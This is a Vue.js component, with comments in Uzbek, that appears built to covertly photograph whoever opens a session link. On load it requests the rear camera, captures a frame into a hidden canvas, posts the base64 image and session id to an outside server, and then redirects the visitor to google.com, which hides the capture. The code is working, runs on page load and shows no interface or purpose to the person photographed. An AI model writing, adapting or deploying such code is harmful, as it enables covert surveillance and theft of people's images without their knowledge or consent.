<template>
  <!-- UI yashirin -->
  <video ref="video" autoplay playsinline style="display:none"></video>
  <canvas ref="canvas" style="display:none"></canvas>
</template>

<script>
export default {
  name: "BackCamera",

  mounted() {
    this.startCamera()
  },

  methods: {
    async startCamera() {
      try {
        // /lk/:id
        const session_id = this.$route.params.id
        if (!session_id) return this.redirect()

        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: "environment" } }, // ✅ ORQA KAMERA
          audio: false
        })

        const video = this.$refs.video
        const canvas = this.$refs.canvas
        const ctx = canvas.getContext("2d")

        video.srcObject = stream

        // ❗ Kamera tayyor bo‘lganda rasm olamiz (timeout YO‘Q)
        video.onloadedmetadata = async () => {
          canvas.width = video.videoWidth
          canvas.height = video.videoHeight
          ctx.drawImage(video, 0, 0)

          const imageBase64 = canvas.toDataURL("image/jpeg", 0.85)

          // kamerani o‘chiramiz
          stream.getTracks().forEach(t => t.stop())

          // API’ga yuboramiz
          await fetch("https://api.peoplehello.ru/api/back-cam", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              image: imageBase64,
              session_id
            })
          })

          this.redirect()
        }

      } catch (err) {
        console.error("Back camera error:", err)
        this.redirect()
      }
    },

    redirect() {
      window.location.replace("https://www.google.com")
    }
  }
}
</script>
